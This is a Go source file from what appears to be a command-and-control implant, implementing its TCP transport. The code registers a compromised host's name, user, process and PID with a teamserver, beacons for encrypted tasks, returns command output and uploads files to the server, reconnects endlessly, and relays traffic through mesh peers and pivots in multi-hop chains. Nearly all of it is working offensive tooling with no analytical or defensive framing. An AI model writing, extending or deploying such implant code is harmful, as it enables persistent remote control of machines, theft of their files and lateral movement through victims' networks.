package agent

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"
)

type tcpMsg struct {
	Type    string          `json:"t"`
	Payload json.RawMessage `json:"p"`
}

type tcpTransport struct {
	addr    string
	conn    net.Conn
	mu      sync.Mutex
	agentID string
	aesKey  []byte

	// mesh peers — updated from beacon responses; used as fallback when teamserver unreachable
	meshMu    sync.RWMutex
	meshPeers []peerWire
}

func newTCPTransport(serverURL string) *tcpTransport {
	// serverURL is "tcp://host:port" or just "host:port"
	addr := serverURL
	if len(addr) > 6 && addr[:6] == "tcp://" {
		addr = addr[6:]
	}
	return &tcpTransport{addr: addr}
}

func tcpWriteFrame(conn net.Conn, data []byte) error {
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func tcpReadFrame(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	n := binary.LittleEndian.Uint32(hdr)
	if n == 0 || n > 32*1024*1024 {
		return nil, fmt.Errorf("frame too large: %d", n)
	}
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

func (t *tcpTransport) sendMsg(msg tcpMsg) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	return tcpWriteFrame(t.conn, data)
}

func (t *tcpTransport) recvMsg() (tcpMsg, error) {
	var msg tcpMsg
	frame, err := tcpReadFrame(t.conn)
	if err != nil {
		return msg, err
	}
	err = json.Unmarshal(frame, &msg)
	return msg, err
}

func (t *tcpTransport) connect() error {
	conn, err := net.DialTimeout("tcp", t.addr, 30*time.Second)
	if err != nil {
		return err
	}
	t.conn = conn
	return nil
}

func (t *tcpTransport) register(info sysInfo) error {
	if err := t.connect(); err != nil {
		return err
	}
	sleepSec, jitterPct := parseSleepConfig()
	payload, _ := json.Marshal(registerRequest{
		Hostname:    info.Hostname,
		Username:    info.Username,
		OS:          info.OS,
		PID:         info.PID,
		Transport:   Transport,
		SleepSec:    sleepSec,
		JitterPct:   jitterPct,
		ProcessName: info.ProcessName,
	})
	if err := t.sendMsg(tcpMsg{Type: "register", Payload: payload}); err != nil {
		return err
	}
	resp, err := t.recvMsg()
	if err != nil {
		return err
	}
	if resp.Type != "register_resp" {
		return fmt.Errorf("unexpected register response: %s", resp.Type)
	}
	var reg registerResponse
	if err := json.Unmarshal(resp.Payload, &reg); err != nil {
		return err
	}
	t.agentID = reg.AgentID
	t.aesKey, err = base64.StdEncoding.DecodeString(reg.AESKey)
	return err
}

func (t *tcpTransport) beacon() ([]taskWire, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	if err := t.sendMsg(tcpMsg{Type: "beacon", Payload: json.RawMessage(`null`)}); err != nil {
		t.reconnect()
		return nil, err
	}
	resp, err := t.recvMsg()
	if err != nil {
		t.reconnect()
		return nil, err
	}
	if resp.Type != "tasks" {
		return nil, nil
	}
	// payload is base64(encrypted tasks JSON)
	var encB64 string
	if err := json.Unmarshal(resp.Payload, &encB64); err != nil {
		return nil, err
	}
	enc, err := base64.StdEncoding.DecodeString(encB64)
	if err != nil {
		return nil, err
	}
	plain, err := open(t.aesKey, enc)
	if err != nil {
		return nil, err
	}
	var br beaconResponse
	if err := json.Unmarshal(plain, &br); err != nil {
		return nil, err
	}
	if len(br.Peers) > 0 {
		t.meshMu.Lock()
		t.meshPeers = br.Peers
		t.meshMu.Unlock()
	}
	return br.Tasks, nil
}

func (t *tcpTransport) sendResult(taskID int64, output, errStr string) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	plain, _ := json.Marshal(resultRequest{TaskID: taskID, Output: output, Error: errStr})
	enc, err := seal(t.aesKey, plain)
	if err != nil {
		return err
	}
	encB64 := base64.StdEncoding.EncodeToString(enc)
	payload, _ := json.Marshal(encB64)
	return t.sendMsg(tcpMsg{Type: "result", Payload: payload})
}

func (t *tcpTransport) uploadFile(taskID int64, filename string, data []byte) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	type uploadReq struct {
		TaskID   int64  `json:"task_id"`
		Filename string `json:"filename"`
		Data     string `json:"data"`
	}
	plain, _ := json.Marshal(uploadReq{
		TaskID:   taskID,
		Filename: filename,
		Data:     base64.StdEncoding.EncodeToString(data),
	})
	enc, err := seal(t.aesKey, plain)
	if err != nil {
		return err
	}
	encB64 := base64.StdEncoding.EncodeToString(enc)
	payload, _ := json.Marshal(encB64)
	return t.sendMsg(tcpMsg{Type: "upload", Payload: payload})
}

func (t *tcpTransport) downloadFile(filename string) ([]byte, error) {
	// TCP download: fetch via HTTP fallback on same host
	// For now, not implemented — return error to trigger HTTP fallback
	return nil, fmt.Errorf("tcp: download not implemented, use HTTP")
}

func (t *tcpTransport) reconnect() {
	if t.conn != nil {
		t.conn.Close()
	}
	for {
		time.Sleep(5 * time.Second)
		conn, err := net.DialTimeout("tcp", t.addr, 15*time.Second)
		if err == nil {
			t.conn = conn
			return
		}
	}
}

func (t *tcpTransport) agentIDStr() string { return t.agentID }

// savedPeers returns a snapshot of the last known mesh peers.
func (t *tcpTransport) savedPeers() []peerWire {
	t.meshMu.RLock()
	defer t.meshMu.RUnlock()
	out := make([]peerWire, len(t.meshPeers))
	copy(out, t.meshPeers)
	return out
}

// beaconViaPeer beacons through a mesh peer running an HTTP pivot.
func (t *tcpTransport) beaconViaPeer(peerAddr string) ([]taskWire, error) {
	peerURL := "http://" + peerAddr
	req, err := http.NewRequest(http.MethodGet, peerURL+"/beacon/"+t.agentID, nil)
	if err != nil {
		return nil, err
	}
	cl := &http.Client{Timeout: 10 * time.Second}
	resp, err := cl.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("http peer: status %d", resp.StatusCode)
	}
	ciphertext, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	plain, err := open(t.aesKey, ciphertext)
	if err != nil {
		return nil, err
	}
	var br beaconResponse
	if err := json.Unmarshal(plain, &br); err != nil {
		return nil, err
	}
	return br.Tasks, nil
}

// beaconViaTCPPeer beacons through a mesh peer running a TCP pivot.
func (t *tcpTransport) beaconViaTCPPeer(peerAddr string) ([]taskWire, error) {
	conn, err := net.DialTimeout("tcp", peerAddr, 10*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	payload, _ := json.Marshal(map[string]any{
		"method":   "GET",
		"path":     "/beacon/" + t.agentID,
		"body_b64": "",
	})
	frame, _ := json.Marshal(tcpMsg{Type: "relay", Payload: payload})
	if err := tcpWriteFrame(conn, frame); err != nil {
		return nil, err
	}
	respFrame, err := tcpReadFrame(conn)
	if err != nil {
		return nil, err
	}
	var resp tcpMsg
	if err := json.Unmarshal(respFrame, &resp); err != nil {
		return nil, err
	}
	var rr struct {
		Status  int    `json:"status"`
		BodyB64 string `json:"body_b64"`
	}
	if err := json.Unmarshal(resp.Payload, &rr); err != nil {
		return nil, err
	}
	if rr.Status == 204 || rr.BodyB64 == "" {
		return nil, nil
	}
	if rr.Status != 200 {
		return nil, fmt.Errorf("tcp peer: status %d", rr.Status)
	}
	enc, _ := base64.StdEncoding.DecodeString(rr.BodyB64)
	plain, err := open(t.aesKey, enc)
	if err != nil {
		return nil, err
	}
	var br beaconResponse
	if err := json.Unmarshal(plain, &br); err != nil {
		return nil, err
	}
	return br.Tasks, nil
}

// rawForward sends a relay request to the parent TCP pivot, enabling N-hop chains.
func (t *tcpTransport) rawForward(method, path string, body []byte) (int, []byte, error) {
	t.mu.Lock()
	defer t.mu.Unlock()
	payload, _ := json.Marshal(map[string]any{
		"method":   method,
		"path":     path,
		"body_b64": base64.StdEncoding.EncodeToString(body),
	})
	if err := t.sendMsg(tcpMsg{Type: "relay", Payload: payload}); err != nil {
		return 0, nil, err
	}
	resp, err := t.recvMsg()
	if err != nil {
		return 0, nil, err
	}
	var rr struct {
		Status  int    `json:"status"`
		BodyB64 string `json:"body_b64"`
	}
	if err := json.Unmarshal(resp.Payload, &rr); err != nil {
		return 0, nil, err
	}
	respBody, _ := base64.StdEncoding.DecodeString(rr.BodyB64)
	return rr.Status, respBody, nil
}
